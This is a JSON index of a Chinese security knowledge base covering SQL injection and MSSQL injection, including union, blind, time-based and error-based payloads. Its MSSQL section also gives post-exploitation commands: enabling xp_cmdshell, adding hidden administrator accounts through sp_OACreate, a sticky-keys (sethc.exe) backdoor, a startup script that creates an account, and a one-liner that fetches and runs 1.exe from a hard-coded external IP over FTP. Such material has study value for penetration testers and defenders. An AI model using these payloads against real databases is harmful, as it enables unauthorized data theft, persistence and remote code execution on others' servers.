{"./":{"url":"./","title":"Introduction","keywords":"","body":" Introduction 关于我 想说的话 Introduction 安全混子 关于我 id value name aaron email aaronluo54@gmail.com location Chengdu,Sichuan/Beijing 想说的话 其实我也没有想说的🚬 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-18 17:32:20 Author: aaron Url: https://byaaronluo.github.io/ Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/01.WEB安全/01.SQLi/":{"url":"知识库/01.WEB安全/01.SQLi/","title":"01.SQLi","keywords":"","body":" 定义 什么是SQL注入 常见数据库 关系型数据库 非关系型数据库 渗透的时候，如何判断数据库？ 定义 SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行未授权的任意查询，从而进一步得到相应的数据信息。 什么是SQL注入 简单的来说，SQL注入是开发者没有对用户的输入数据进行严格的限制/转义，致使用户在输入一些特定的字符时，在与后端设定的sql语句进行拼接时产生了歧义，使得用户可以控制该条sql语句与数据库进行通信。 简单举个例子 fetch_row()){ echo \"success\"; }else{ echo \"fail\"; } ?> 上述代码模拟web应用程序进行登录操作。若登录成功，则返回success，失败则返回fail 正常用户登录，sql语句如下： select * from users where username = '$username' and password='$password' 其中，变量$username 与变量$password为用户可以控制的内容，正常情况下，用户所输入的内容在sql语义上都将作为字符串，被赋值给字段来当做整条select查询语句的筛选条件。 若用户输入的$username为admin'-- ，$password为123。那么拼接到sql语句中将得到如下结果 select * from users where username = 'admin'-- ' and password='123' 这里的-- 是单行注释符，可以将'admin' 后面的内容给注释掉，让此条sql语句的语义发生变化，就算用户输入错误的密码，也可以完成登录操作，这就是我们常说的万能密码之一。 常见数据库 数据库包括关系型数据库和非关系型数据库，这两类数据库最主要的区别如下表所示 关系型数据库 非关系型数据库 特性 1. 采用了关系模型来组织数据的数据库2. 事务的一致性3.关系模型指的就是二维表格模型，而一个关系型数据库就是由二维表及其之间的联系所组成的一个数据组织 使用键值对存储数据；分布式；一般不支持ACID特性；非关系型数据库严格上不是一种数据库，应该是一种数据结构化存储方法的集合 优点 1.容易理解：二维表结构是非常贴近逻辑世界一个概念，关系模型相对网状、层次等其他模型来说更容易理解；2.使用方便：通用的SQL语言使得操作关系型数据库非常方便；3.易于维护：丰富的完整性(实体完整性、参照完整性和用户定义的完整性)大大减低了数据冗余和数据不一致的概率；4.支持SQL，可用于复杂的查询 1.无需经过sql层的解析，读写性能很高；2.无需经过sql层的解析，读写性能很高；3.基于键值对，数据没有耦合性，容易扩展；4.存储数据的格式：nosql的存储格式是key,value形式、文档形式、图片形式等等，文档形式、图片形式等等，而关系型数据库则只支持基础类型 缺点 1.为了维护一致性所付出的巨大代价就是其读写性能比较差；2.固定的表结构；3.高并发读写需求；4.海量数据的高效率读写； 1.不提供sql支持，学习和使用成本较高；2.无事务处理，附加功能bi和报表等支持也不好 常见的关系型数据库和非关系型数据库有如下几种，我们主要讨论关系型数据库的注入问题，非关系型数据库暂不讨论 关系型数据库 mysql Oracle postgresql mssql DB2 非关系型数据库 MongoDB Redis influxdb 。。。渗透的时候，如何判断数据库？ 方法 数据库 常用搭配 asp => mssql / access.net => mssqlphp => mysql,postgresqljava => mysql,oracle 默认端口 oracle => 1521mssql => 1433mysql => 3306postgresql => 5432 数据库特有函数 pg_sleep() => postgresqlbenchmark() => mysqlwaitfor delay => mssqlDBMS_PIPE.RECEIVE_MESSAGE() => oracle... 特殊符号 ; => 字句查询标识符，postgresql，mssql 默认可堆叠查询;# =>Mysql 注释符 特定表名 information_schema => mssql,postgresql,mysqlpg_tables => postgresqlsysobjects => mssqlall_tables,user_tables => oracle 报错banner信息 ... Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 14:02:10 Author: aaron Url: https://byaaronluo.github.io/知识库/01.WEB安全/01.SQLi/ Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/01.WEB安全/01.SQLi/MSSQL/MSSQL.html":{"url":"知识库/01.WEB安全/01.SQLi/MSSQL/MSSQL.html","title":"MSSQL","keywords":"","body":" MSSQL 简介 客户端/服务器数据库系统 基础知识 系统库 危险的存储过程 xp_cmdshell xp_dirtree OPENROWSET 沙盒 SP_OACREATE 参考链接 MSSQL 简介 SQL Server是Microsoft开发的关系数据库管理系统（RDBMS）。 它是市场上最受欢迎的DBMS之一。SQL Server具有极其广泛的用途，它可以在各个方面使用,从存储个人博客的内容到存储客户数据等。 在2017版之前，SQL Server仅适用于Windows。 SQL Server 2017中最大的变化之一是，它现在可在Linux和Docker容器上使用。 这意味着可以在Mac上运行SQL Server。 SQL Server的可用版本 版本 描述 Enterprise Edition 此版本仅在Windows Server操作系统上运行。 适用于对速度和可用性具有较高优先级的大型生产数据库服务器。提供复制和联机分析过程（OLAP）服务等功能，这些服务可能会增加其安全风险。 Standard Edition 该版本与Enterprise Edition相似，但缺少虚拟接口系统局域网（VI SAN）支持和某些高级OLAP功能。 Personal Edition 它旨在用于工作站和便携式计算机，而不是服务器。 其设计最多支持五个数据库用户。 Developer Edition 面向开发人员版本，它与Enterprise Edition具有相似的功能，但并不意味着可以在真实的生产环境中运行。 客户端/服务器数据库系统 SQL Server是一个客户端/服务器数据库管理系统（DBMS）。 这允许有许多不同的客户端同时，全部连接到SQL Server。 这些客户端的每一个都可以通过不同的工具进行连接。 例如，一个客户端可能使用如SQL Server Management Studio（SSMS）之类的图形工具，而另一客户端可能使用诸如sqlcmd之类的命令行工具。 同时，网站也可以从Web应用程序连接到SQL Server。 并且可能有许多其他客户端都使用自己的工具出于自己的目的进行连接。 客户端/服务器DBMS的主要优点是多个用户可以同时访问它，每个用户都有特定的访问级别。如果数据库管理员配置对应的权限，则任何连接到SQL Server的客户端将只能访问他们被允许访问的数据库。 他们只能执行允许执行的任务。 所有这些都从SQL Server本身内部进行控制。 SQL Server是在服务帐户的上下文中在操作系统上运行的一组Windows服务。每次安装SQL Server实例时，实际上都会安装一组Windows服务并具有唯一的名称。现有的SQL Server帐户类型： Windows帐户。 SQL Server登录名（SQL Server内部）。 数据库用户（SQL Server内部）。 Windows帐户和SQL Server登录名用于登录SQL Server。除非系统管理员，否则必须将SQL Server登录名映射到数据库用户才能访问数据。数据库用户是在数据库级别内单独创建的。 SQL Server的常见角色是： Sysadmin角色：SQL Server管理员。 Public角色：最低特权，类似于Windows中的everyone组。 更多请参考：https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/server-level-roles?view=sql-server-2017基础知识 系统库 在每个网站中，一般一个网站不会跨库，而且在MSSQL中的每个库都有一个系统自带表：sysobjects 此信息表中对我们有用的只有3个字段，NAME,XTYPE,ID字段，name 表示表名，xtype 表示表的类型，id字段的值用来连接syscolumns表 sysobjects是一个系统视图，用于存放该数据库内创建的所有对象，如约束、默认值、日志、规则、存储过程等，而xtype代表对象的类型。 类型简称 含义 U 表（用户定义类型） V 视图 P 存储过程 X 拓展存储过程 危险的存储过程 xp_cmdshell 查询xp_cmdshell存储过程是否存在 xtype为对象类型，xtype='x'，表示存储过程的对象类型为扩展存储过程。 select * from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell' 最为经典的就是这个组件了,但是2005之后就默认关闭,而且现在来说都会把这个扩展删除掉 激活命令 EXEC sp_configure 'show advanced options', 1; RECONFIGURE; exec SP_CONFIGURE 'xp_cmdshell', 1; RECONFIGURE; 相关问题 未能找到存储过程'master..xpcmdshell'. 恢复方法： EXEC sp_addextendedproc xp_cmdshell,@dllname ='xplog70.dll' declare @o int EXEC sp_addextendedproc 'xp_cmdshell', 'xpsql70.dll' 无法装载 DLL xpsql70.dll 或该DLL所引用的某一 DLL。原因126（找不到指定模块。） 恢复方法： EXEC sp_dropextendedproc \"xp_cmdshell\" EXEC sp_addextendedproc 'xp_cmdshell', 'xpsql70.dll' 无法在库 xpweb70.dll 中找到函数 xp_cmdshell。原因: 127(找不到指定的程序。) 恢复方法： exec sp_dropextendedproc 'xp_cmdshell' exec sp_addextendedproc 'xp_cmdshell','xpweb70.dll' SQL Server 阻止了对组件 'xp_cmdshell' 的 过程'sys.xp_cmdshell' 的访问，因为此组件已作为此服务器安全配置的一部分而被关闭。系统管理员可以通过使用 sp_configure 启用 'xp_cmdshell'。有关启用 'xp_cmdshell' 的详细信息，请参阅 SQL Server 联机丛书中的 \"外围应用配置器\"。 恢复方法： EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; xp_dirtree 获取文件信息,可以列举出目录下所有的文件与文件夹 参数说明:目录名,目录深度,是否显示文件 execute master..xp_dirtree 'c:' execute master..xp_dirtree 'c:',1 execute master..xp_dirtree 'c:',1,1 OPENROWSET OPENROWSET 在MSSQL 2005及以上版本中默认是禁用的.需要先打开: 激活语句 EXEC sp_configure 'show advanced options', 1; exec sp_configure RECONFIGURE; exec SP_CONFIGURE 'Ad Hoc Distributed Queries', 1; exec sp_configure RECONFIGURE; SELECT * FROM OPENROWSET('SQLOLEDB', '数据库地址';'数据库用户名';'数据库密码', 'SET FMTONLY OFF execute master..xp_cmdshell \"dir\"'); 这种攻击是需要首先知道用户密码的 沙盒 开启沙盒： exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWAREMicrosoftJet4.0Engines','SandBoxMode','REG_DWORD',1 执行命令: select * from openrowset('microsoft.jet.oledb.4.0',';database=c:windowssystem32iasdnary.mdb','select shell(\"whoami\")') SP_OACREATE 其实xp_cmdshell一般会删除掉了,如果xp_cmdshell 删除以后，可以使用SP_OACreate 需要注意的是这个组件是无回显的,你可以把他直接输出到web目录下的文件然后读取 激活命令 EXEC sp_configure 'show advanced options', 1; exec sp_configure RECONFIGURE; exec sp_configure 'Ole Automation Procedures', 1; exec sp_configure RECONFIGURE; 下面是收集来的sp_OACreate的一些命令: -- 1）直接加用户 -- 2000系统 declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\\winnt\\system32\\cmd.exe /c net user 123 123 /add' declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\\winnt\\system32\\cmd.exe /c net localgroup administrators 123/add' -- xp和2003系统： declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\\windows\\system32\\cmd.exe /c net user 123$ 123/add' declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\\windows\\system32\\cmd.exe /c net localgroup administrators 123$ /add' -- 2）粘贴键替换 declare @o int exec sp_oacreate 'scripting.filesystemobject', @o out exec sp_oamethod @o, 'copyfile',null,'c:\\windows\\explorer.exe' ,'c:\\windows\\system32\\sethc.exe'; declare @o int exec sp_oacreate 'scripting.filesystemobject', @o out exec sp_oamethod @o, 'copyfile',null,'c:\\windows\\system32\\sethc.exe' ,'c:\\windows\\system32\\dllcache\\sethc.exe'; -- 需要同时具备sp_oacreate 和sp_oamethod 两个功能组件 -- 3）直接传马 DECLARE @shell INT EXEC SP_OAcreate 'wscript.shell',@shell OUTPUT EXEC SP_OAMETHOD @shell,'run',null, '%systemroot%\\system32\\cmd.exe /c echo open 222.180.210.113 > cmd.txt&echo 123>> cmd.txt&echo123>> cmd.txt&echo binary >> cmd.txt&echo get 1.exe >> cmd.txt&echo bye >> cmd.txt&ftp -s:cmd.txt&1.exe&1.exe&del cmd.txt. /q /f&del 1.exe /f /q'-- -- 4）启动项写入加账户脚本 declare @sp_passwordxieo int, @f int, @t int, @ret int exec sp_oacreate 'scripting.filesystemobject', @sp_passwordxieo out exec sp_oamethod @sp_passwordxieo, 'createtextfile', @f out, 'd:\\RECYCLER\\1.vbs', 1 exec @ret = sp_oamethod @f, 'writeline', NULL,'set wsnetwork=CreateObject(\"WSCRIPT.NETWORK\")' exec @ret = sp_oamethod @f, 'writeline', NULL,'os=\"WinNT://\"&wsnetwork.ComputerName' exec @ret = sp_oamethod @f, 'writeline', NULL,'Set ob=GetObject(os)' exec @ret = sp_oamethod @f, 'writeline', NULL,'Set oe=GetObject(os&\"/Administrators,group\")' exec @ret = sp_oamethod @f, 'writeline', NULL,'Set od=ob.Create(\"user\",\"123$\")' exec @ret = sp_oamethod @f, 'writeline', NULL,'od.SetPassword \"123\"' exec @ret = sp_oamethod @f, 'writeline', NULL,'od.SetInfo' exec @ret = sp_oamethod @f, 'writeline', NULL,'Set of=GetObject(os&\"/123$\",user)' exec @ret = sp_oamethod @f, 'writeline', NULL,'oe.add os&\"/123$\"'; 5）如果该服务器有网站，则直接用方法4）写入一句话 参考链接 https://xz.aliyun.com/t/9475 https://xz.aliyun.com/t/8513 https://www.anquanke.com/post/id/86011 https://xie1997.blog.csdn.net/article/details/88679754 https://www.cnblogs.com/lishuyi/p/4111496.html https://blog.csdn.net/Fly_hps/article/details/80301792 https://xz.aliyun.com/t/7534 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 11:28:06 Author: aaron Url: https://byaaronluo.github.io/知识库/01.WEB安全/01.SQLi/MSSQL/MSSQL.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/01.WEB安全/01.SQLi/MSSQL/MSSQL常见符号函数符号归类.html":{"url":"知识库/01.WEB安全/01.SQLi/MSSQL/MSSQL常见符号函数符号归类.html","title":"MSSQL常见符号函数符号归类","keywords":"","body":" 符号 注释符 常用运算符 常见全局变量 函数 系统函数信息 进制转换 字符串操作函数 其他函数/语句 常见SQL语句 获取数据库权限 获取系统相关信息 获取数据库 获取表 获取字段 获取值 符号 注释符 注释符 释义 -- SQL注释风格 ;%00 空字节 /* C注释风格 常用运算符 运算符 释义 + 加法运算 - 减法运算 * 乘法运算 / 除法运算 % 取模运算 & 位与逻辑运算 | 位或逻辑运算 ... ... 常见全局变量 变量 释义 @@VERSION SQL Server 版本 @@SEVERNAME 运行SQL Server 的本地服务器名称 函数 系统函数信息 函数 释义 DB_NAME() 获取当前数据库名 USER_NAME() / USER 获取用户在数据库中的名字 is_srvrolemember('sysadmin') is_srvrolemember('db_owner') is_srvrolemember('public') | 判断当前用户权限 | 进制转换 函数 释义 ASCII(str) 返回字符表达式最左端字符的ASCII 码值 CHAR(str) 将ASCII 码转换为字符 cast(16 as VARBINARY(50)) 将16转换为16进制 CONVERT(VARBINARY(50),16) 将16转换为16进制 master.dbo.fn_varbintohexstr(16) 将16转换为16进制 STR(n) 将数值型数据转为字符型数据 字符串操作函数 函数 释义 SUBSTRING (， ， length) 返回从字符串左边第starting_ position 个字符起length个字符的部分。 LEFT (， ) 返回character_expression 左起 integer_expression 个字符。 RIGHT (， ) 返回character_expression 右起 integer_expression 个字符 QUOTENAME (expression’>[， quote character]) 返回被特定字符括起来的字符串。 REPLICATE (character_expression,integer_expression) 返回一个重复character_expression 指定次数的字符串。 REVERSE () 将指定的字符串的字符排列顺序颠倒 REPLACE (， ， ) 用string_expression3 替换在string_expression1 中的子串string_expression2。 SPACE () 返回一个有指定长度的空白字符串。 STUFF (， ， ，) 用另一子串替换字符串指定位置、长度的子串。 LEFT (， ) 返回character_expression 左起 integer_expression 个字符。 RIGHT (， ) 返回character_expression 右起 integer_expression 个字符。 CHARINDEX (， ) 返回字符串中某个指定的子串出现的开始位置 其中substring expression 是所要查找的字符表达式，expression 可为字符串也可为列名表达式。如果没有发现子串，则返回0 值。 此函数不能用于TEXT 和IMAGE 数据类型。 | | PATINDEX (， name>) | 其中子串表达式前后必须有百分号“%”否则返回值为0。 返回字符串中某个指定的子串出现的开始位置。 与CHARINDEX 函数不同的是，PATINDEX函数的子串中可以使用通配符，且此函数可用于CHAR、 VARCHAR 和TEXT 数据类型。 | | CONCAT | 连接字符串函数，MSSQL 2012+ 支持 | 其他函数/语句 函数/语句 释义 IF...ELSE... 条件语句 case when exp then state1 ELSE state2 end 条件语句 WAITFOR DELAY '0:0:n' 延迟n s LEN(str) 计算字符串长度 LOWER(str) 将字符串的大写字母全部转成小写 UPPER(str) 将字符串的小写字母全部转成大写 LTRIM() 字符串头部的空格去掉 RTRIM() 把字符串尾部的空格去掉 常见SQL语句 获取数据库权限 select is_srvrolemember('sysadmin') select is_srvrolemember('db_owner') select is_srvrolemember('public') 获取系统相关信息 -- 获取版本 select @@version; -- 获取用户名 select user; -- 获取服务器主机名 select @@servername; 获取数据库 -- 当前数据库 select db_name(); -- 其他数据库,n为number类型 select db_name(n); -- 所有数据库 select name from master..sysdatabases; 获取表 select name from test..sysobjects where xtype = 'u' -- 或者 -- 每个库都有information_schema，可以不用加test，也支持跨库查，需要注意这样查询出来使用视图的 select table_name from test.information_schema.tables -- 从当前库获取表，去除视图 select table_name from information_schema.tables where table_type not in ('view'); 获取字段 select name from test..syscolumns where id = (select id from test..sysobjects where name = 'users') -- 或者 select column_name from test.information_schema.columns where table_name = 'users'; --或者，以下不支持跨库查询 select top 1 col_name(object_id('users'),1) from sysobjects; -- i 为第几个字段，int型 select top 1 col_name(object_id('users'),i) from sysobjects; 获取值 select username, password from users; Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 10:41:21 Author: aaron Url: https://byaaronluo.github.io/知识库/01.WEB安全/01.SQLi/MSSQL/MSSQL常见符号函数符号归类.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/01.WEB安全/01.SQLi/MSSQL/MSSQL注入基础.html":{"url":"知识库/01.WEB安全/01.SQLi/MSSQL/MSSQL注入基础.html","title":"MSSQL注入基础","keywords":"","body":" 初始化环境 联合查询注入 注入流程 确定字段段数量 判断数据库权限 判断页面回显位 查询数据 盲注 布尔盲注 时间盲注 报错注入 convert() db_name() file_name() filegroup_name() col_name() object_name() type_name() cast() schema_name() 、 having 1=1 爆表名 group by ... having 1=1 爆列名 order by 注入 判断order by 注入点 开启错误提示 关闭错误提示 堆叠注入 二次注入 HTTP头部注入 文件操作 读 写 DB_owner权限LOG备份Getshell DB_owner权限差异备份Getshell 初始化环境 环境 版本 服务器 windows server 2003 sp2 web容器 IIS6.0 数据库 SQLServer 2000 personal 由于环境不太好找，这里使用Github大佬提供的一个MSSQL-SQLi-LABS作为环境依赖，MSSQL也是标准的关系型数据库，大多数注入方法都与MYSQL注入篇相似，但是MSSQL比MYSQL相对权限要更大，且在Windows域中只要有较高权限，就能影响域的安全，本篇只介绍基础注入知识，只谈针对MSSQL该如何注入 联合查询注入 页面将SQL语句返回的内容显示在了页面中(本例中是用户名、密码)，这种情况叫有回显的注入。 对于有回显的情况来说，通常使用联合查询注入法，其作用就是，在原来查询条件的基础上，通过关键字union ，union all，从而拼接恶意SQL语句，union后面的select 得到的结果将拼接到前个select的结果的后面 若回显仅支持一行数据的话，让union前边正常的查询语句返回的结果为空 使用union select进行拼接时，注意前后两个select语句的返回的字段数必须相同，否则无法拼接 union，union all区别 union: 对两个结果集进行并集操作，不包括重复行，同时进行默认规则的排序 union all: 对两个结果集进行并集操作，包括重复行，不进行排序； 注入流程 这里以mssql-sqli-labs less 1 举例 确定字段段数量 使用order by语句，通过拼接数字，可确定字段数量，若大于，则页面错误/无内容，若小于/等于，则页面正常，若错误页面与正确页面一致，更换盲注或报错注入。 正常页面： 错误页面： 判断数据库权限 // 判断是否是系统管理员 ?id=2' and 1=(select is_srvrolemember('sysadmin'))--+ // 判断是否是库权限 ?id=2' and 1=(select is_srvrolemember('db_owner'))--+ // 判断是否是 public 权限 ?id=2' and 1=(select is_srvrolemember('public'))--+ 判断页面回显位 根据上述判断的字段数量，使用union select 1,2,3,x... 将定义的数字显示在页面上，即可从中判断页面显示的字段位置。 注意： 若确定页面有回显，但是页面中并没有我们定义的特殊标记数字出现，可能是页面现在了单行数据输出，我们让前边的select查询条件返回结果为空即可 注意一定要拼接够足够的字段数，否则SQL语句报错。PS：此方法也可作为判断前条select语句的方法之一 如果union前面的查询条件返回为空的情况下，也没有标记数字，这时候一般是类型出错，导致无法显示在页面，可以将数字更改未null，如下所示 在这里，我们可以看到，column2，column3 的类型是varchar，但是给的类型为int，所以在字符在转换为int类型的时候，会报错，在这里，如果无法判断，则使用null来代替显位，或者使用逐一判断字符类型 查询数据 通过第3步，找到显位之后，在显示字段位置使用子查询或直接查询，来查询数据； 首先通过db_name()查询当前数据库，数据库当前用户user，数据库版本@@version，服务器主机@@SERVERNAME 查询数据库 使用db_name()函数，传入数字类型就可以遍历所有的数据库 ?id=-1' union select 1,db_name(1),3--+ 或者查询master..sysdatabases来获取表名 ?id=-1' union select '1',name,'3' from master..sysdatabases--+ 当只能获取一个字段的时候，如下所示 由于mssql2000 没有concat函数（mssql 2012支持），所以我们尝试使用如下payload，以此类推 ?id=-1' union select '1',name,'3' from master..sysdatabases where name != 'master' --+ ?id=-1' union select '1',name,'3' from master..sysdatabases where name not in ('master','model','msdb') --+ 或者 select catalog_name from information_schema.schemata; 查表 在获取了当前的数据库，此时需要获取当前数据库的表，使用current_database..sysobjects(此时current_database为test，所以为test..systobjects)，条件为U（用户表） // 查当前库的第一个表 ?id=-1' union select top 1 '1',name,3 from test..sysobjects where xtype='U'--+ // 查当前库的第一个表 select top 1 name from sysobjects where xtype='u' // 查当前数据库的第一个表 -- test.information_schema.tables 包含视图 而 test..sysobjects where xtype = 'U' 只包含用户创建的表 select top 1 table_name from information_schema.tables // 查询master库第一个表名，以此类推 select top 1 table_name from master.information_schema.tables 查字段 // 支持跨库查询 ?id=-2' union select top 1 1,name,'3' from test..syscolumns where id = (select id from test..sysobjects where name='users')--+ // 或者 ?id=-2' union select top 1 1,column_name,'3' from test.information_schema.columns where table_name = 'users'--+ // 或者,但是以下不支持跨库查询 ?id=-2' union select top 1 1,name,'3' from test..syscolumns where id = OBJECT_ID('users')--+ // 或者 ?id=-2' union select top 1 1,(select top 1 col_name(object_id('users'),1) from sysobjects),3--+ ?id=-2' union select top 1 1,(select top 1 col_name(object_id('users'),{i}) from sysobjects),3--+ 查值 在已知表名，列名的情况下，直接使用select 语句查询即可 ?id=-2' union select top 1 1,username,password from users--+ 盲注 布尔盲注 布尔盲注其实和mysql布尔盲注一样，通过页面对永真条件，or 1=1 与 永假条件，and 1=2 返回的内容是否存在差异，进行判断是否可以进行布尔盲注。通常返回存在/不存在两个结果，就可以判断是否存在布尔盲注 -- 语句如下，如果condition为真，那么整条语句 where 语句则恒真 select * from users where username=$username and (condition) and 1=1 恒真 and 1=2 恒假 利用这一特性，我们可以构造payload 通过来页面显示情况来获取数据库数据 布尔盲注常用函数 ascii() substring() count() len() 同mysql，一般注入流程为 求闭合字符 求当前数据库长度 求当前数据库ascii码值 求表名的数量 求表名的长度 求表名的ascii码值 求列名的数量 求列名的长度 求列名的ascii码值 求字段的数量 求字段的长度 求字段的ascii码值 求当前数据库长度 select * from users where id = '1' and len(db_name()) = 4 --+ 依次求解当前数据库的ascii码值，如果能猜字符可以不用ascii函数 select * from users where id = '1' and ascii(substring(db_name(),1,1)) = 116 --+ 求当前数据库中表的个数 select * from users where id = '1' and 4 = (select count(*) from test..sysobjects where xtype='U')--+ -- test.information_schema.tables 包含视图 而 test..sysobjects where xtype = 'U' 只包含用户创建的表 select * from users where id = '1' and 6 = (select count(*) from test.information_schema.tables)--+ -- information_schema去除视图 select * from users where id = '1' and 4 = (select count(*) from test.information_schema.tables where table_type not in ('view'))--+ 求当前数据库表的长度 select * from users where id = '1' and 5 = (select top 1 len(name) from test..sysobjects where xtype='U')--+ -- 求第二个表 select * from users where id = '1' and 6 = (select top 1 len(name) from test..sysobjects where xtype='U' and len(name) not in(5))--+ -- 依次类推求完所有表的长度。。。 求当前数据库表的ascii码值 select * from users where id = '1' and 117 = ascii(substring((select top 1 name from test..sysobjects where xtype='u'),1,1))--+ -- 求第二个表的ascii码值 select * from users where id = '1' and 101 = ascii(substring((select top 1 name from test..sysobjects where xtype='u' and name not in ('users')),1,1))--+ -- 依次类推，分别求解 求当前数据库某表的列名个数 -- 以下支持跨库查询 select * from users where id = '1' and 3 = (select count(*) from test..syscolumns where id = (select id from test..sysobjects where name='users'))--+ -- 或 -- 以下只支持查询该库下的列，不支持跨库查询 select * from users where id = '1' and 3 = (select count(*) from test..syscolumns where id = object_id('users'))--+ 求当前数据库某表中列名的长度 select * from users where id = '1' and 2 = (select top 1 len(name) from test..syscolumns where id = object_id('users'))--+ -- 依次类推求各个字段的长度 select * from users where id = '1' and 8 = (select top 1 len(name) from test..syscolumns where id = object_id('users') and len(name) not in(2))--+ 求当前数据库某表中列名的ascii码值 -- 可跨库查询 select * from users where id = '1' and 105 = ascii(substring((select top 1 name from test..syscolumns where id = (select id from test..sysobjects where name='users')),1,1))--+ -- 不跨库查询，推荐以下 select * from users where id = '1' and 105 = ascii(substring((select top 1 col_name(object_id('users'),1) from sysobjects),1,1))--+ -- {i} 为第i 个字段 select * from users where id = '1' and 105 = ascii(substring((select top 1 col_name(object_id('users'),{i}) from sysobjects),1,1))--+ 求当前数据库某表字段的个数 select * from users where id = '1' and 13 = (select count(*) from users)--+ 求当前数据库user表username字段第一个值的长度 select * from users where id = '1' and 4 = (select top 1 len(username) from users)--+ -- 这里要是知道了id值，可以用where [condition] id 来代替 top 1 ... where len(username) not in (/\\d/) 求当前数据库user表username字段第一个值的ascii码值 select * from users where id = '1' and 68 = ascii(substring((select top 1 username from users),1,1))--+ -- 依次求解，使用top 1 ... where username/id... not in('Dumb')... 时间盲注 延时函数 waitfor delay WAITFOR是SQL Server中Transact-SQL提供的⼀个流程控制语句。它的作⽤就是等待特定时间，然后继续执⾏后 续的语句。它包含⼀个参数DELAY，⽤来指定等待的时间。 如果将该语句成功注⼊后，会造成数据库返回记录和 Web请求也会响应延迟特定的时间。由于该语句不涉及条件判断等情况，所以容易注⼊成功。 语法： WAITFOR DELAY '0:0:n' 示例： WAITFOR DELAY '0:0:4' -- 表⽰延迟4秒 时间盲注通过页面返回的内容的响应时间差异进行条件判断，但是在mssql中，默认可使用堆叠查询，这个也是判断mssql与mysql的区别之一，所以在判断注入点有三种方式，如下： 直接带入查询 堆叠查询判断注入点 select * from users where id = '1';waitfor delay '0:0:3' if判断注入点 select * from users where id = '1' if (1=1) waitfor delay '0:0:4' select * from users where id = '1' if (1=2) waitfor delay '0:0:4' 通常使用if语句来查询数据，if语句中判断True,False同布尔注入 报错注入 报错注入通常情况下在服务器开启报错信息返回，也就是发生错误时返回报错信息，通过特殊函数的错误使用使其参数被页面输出。 convert() CONVERT()函数是把⽇期转换为新数据类型的通⽤函数。 CONVERT(data_type(length),data_to_be_converted,style) 注释 ： data_type(length) 转换为⽬标数据类型（带有可选的长度）。 data_to_be_converted 含有需要转换的值。 style 规定⽇期/时间的输出格式。 -- 示例 CONVERT(VARCHAR(19),GETDATE()) CONVERT(VARCHAR(10),GETDATE(),110) CONVERT(VARCHAR(11),GETDATE(),106) CONVERT(VARCHAR(24),GETDATE(),113) -- 结果 09 22 2021 11:39AM 09-22-2021 22 09 2021 22 09 2021 11:41:19:480 对于 convert(int,@@version)，convert 函数⾸先会执⾏第⼆个参数指定的SQL查询，然后尝试将查询结果转换为int类型。但是，由于这个SQL查询的结果是varchar类型，⽆法进⾏指定的转换，所以，convert函数会抛出 ⼀个SQL server错误消息，指出“SQL查询结果”⽆法转换为“int”类型，这样就能得到的这个SQL查询的结果了。如下所示 查数据库 select * from users where id = '1' and 1 = convert(int,db_name())--+ 查表名 select * from users where id = '1' and 1 = convert(int,(select top 1 name from test..sysobjects where xtype='u'))--+ 查列名 select * from users where id = '1' and 1 = convert(int,(select top 1 name from test..syscolumns where id = (select id test..sysobjects where name = 'users')))--+ 查值 select * from users where id = '1' and 1 = convert(int,(select top 1 username from users))--+ db_name() 此函数返回指定数据库的名称 DB_NAME ( [ database_id ] ) 名称DB_NAME将返回的数据库的标识号 (ID) 。如果调用DB_NAME省略database_id，则DB_NAME返回当前数据库的名称。 返回nvarchar(128) select * from users where id = '1' and 1 = db_name((select top 1 name from test..sysobjects where xtype = 'u' and name not in ('users')))--+ file_name() 此函数返回给定文件标识 (ID) 号的逻辑文件名。 file_name(id) 其文件名的文件标识号FILE_NAME。file_id具有int数据类型。返回nvarchar(128) file_ID对应于 sys.master_files 目录视图或 sys.database_files 目录视图中的 file_id 列。 select * from users where id = '1' and 1 = file_name((select top 1 name from test..sysobjects where xtype = 'u' and name not in ('users')))--+ filegroup_name() select * from users where id = '1' and 1 = filegroup_name((select top 1 name from test..sysobjects where xtype = 'u' and name not in ('users')))--+ col_name() 此函数根据表列的表标识号和列标识号值返回表列的名称。 COL_NAME ( table_id , column_id ) table_id 自变量具有一个 int 数据类型,column_id 自变量具有一个 int 数据类型,返回系统名称 object_name() 返回架构范围内对象的数据库对象名称。 OBJECT_NAME ( object_id [, database_id ] ) object_id 的数据类型为 int，并假定为指定数据库或当前数据库上下文中的架构范围内的对象 database_id 的数据类型为 int。要在其中查找对象的数据库的 ID 返回sysname type_name() 返回指定类型 ID 的未限定的类型名称。 TYPE_NAME ( type_id ) type_id type_id 的数据类型为 int，它可以引用调用方有权访问的任意架构中的类型。返回sysname cast() 将表达式由一种数据类型转换为另一种数据类型。 CAST ( expression AS data_type [ ( length ) ] ) expression 任何有效的表达式。 data_type 目标数据类型。 这包括 xml、bigint 和sql_variant 。 不能使用别名数据类型。 length 指定目标数据类型长度的可选整数，适用于允许用户指定长度的数据类型。 默认值为 30。 style 指定 CONVERT 函数将如何转换 expression 的整数表达式。 对于 NULL 的样式值，则返回 NULL。 data_type 确定范围。\\ 返回转换为 data_type 的 